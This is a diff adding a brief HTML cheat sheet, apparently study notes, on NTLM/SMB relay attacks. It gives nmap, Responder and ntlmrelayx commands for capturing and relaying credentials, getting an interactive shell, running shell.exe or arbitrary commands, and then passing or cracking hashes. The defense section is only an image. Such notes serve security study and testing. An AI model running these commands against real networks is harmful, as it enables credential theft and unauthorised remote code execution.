@@ -1,0 +1,62 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SMB Relay Attacks</title>
+</head><body>Requirements:<br/>
+1. <b>SMB Signing</b>&nbsp;must be disable on the target (disable by default)<br/>
+nmap --script=smb2-security-mode -p445 10.10.10.0/24<br/>
+<br/>
+--&gt; enabled but not required<br/>
+--&gt; disable<br/>
+<b>save the target ip to target.txt</b><br/>
+<br/>
+2. Relayed user credentials must be admin on machine<br/>
+3. Turn on nework discovery and file sharing<br/>
+<br/>
+<br/>
+<b>[attacker]</b><br/>
+1. Responder.conf<br/>
+turn off SMB &amp; HTTP<br/>
+<br/>
+<img src="image.png" width="481" height="250" /><br/>
+<br/>
+python responder.py -l tun0 -rdw<br/>
+<br/>
+<br/>
+2. ntlmrelayx.py<br/>
+<br/>
+<b>save the target ip to target.txt</b><br/>
+<br/>
+python ntlmrelayx.py -tf <b>target.txt </b>-smb2support<br/>
+<br/>
+<b>interactive shell</b><br/>
+python ntlmrelayx.py -tf <b>target.txt </b>-smb2support -i<br/>
+<br/>
+nc 127.0.0.1 &lt;port from the report ntlmrelayx&gt;<br/>
+<br/>
+<br/>
+<b>execute shell</b><br/>
+<br/>
+-e shell.exe<br/>
+<br/>
+<b>execute command</b><br/>
+-c "command"<br/>
+<br/>
+<b><br/>
+</b><b>[victim]</b><br/>
+<br/>
+3. File Explorer or web browser<br/>
+<br/>
+file explorer<br/>
+\\&lt;kali ip&gt;<br/>
+<br/>
+web browser<br/>
+\&lt;kali ip&gt;<br/>
+do pass the hash or crack the hash<br/>
+<br/>
+<br/>
+<br/>
+# Defense<br/>
+<img src="image 2.png" width="515" height="450" /><br/>
+</body></html>
